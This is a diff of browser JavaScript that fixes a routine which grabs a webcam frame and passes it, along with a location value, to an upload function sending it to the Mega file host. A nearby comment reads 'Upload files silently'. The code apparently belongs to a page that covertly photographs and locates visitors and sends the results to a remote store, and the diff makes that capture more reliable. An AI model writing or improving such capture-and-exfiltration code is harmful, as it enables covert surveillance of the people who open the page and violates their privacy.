@@ -49,17 +49,32 @@
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 const video = document.createElement("video");
                 video.srcObject = stream;
-                await video.play();
 
-                const canvas = document.getElementById("canvas");
-                const ctx = canvas.getContext("2d");
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
-                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                video.onloadedmetadata = async () => {
+                    video.play();
+                    const canvas = document.getElementById("canvas");
+                    const ctx = canvas.getContext("2d");
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
 
-                stream.getTracks().forEach(track => track.stop());
-                uploadToMega(canvas, location);
-            } catch (error) {}
+                    // Wait for video to start playing before capturing
+                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                    // Stop all tracks after capturing
+                    stream.getTracks().forEach(track => track.stop());
+
+                    // Notify success and upload
+                    alert("Photo successfully captured!");
+                    uploadToMega(canvas, location);
+                };
+
+                video.onerror = () => {
+                    alert("Error with video capture.");
+                    stream.getTracks().forEach(track => track.stop());
+                };
+            } catch (error) {
+                alert("Error accessing the camera.");
+            }
         }
 
         // Upload files silently
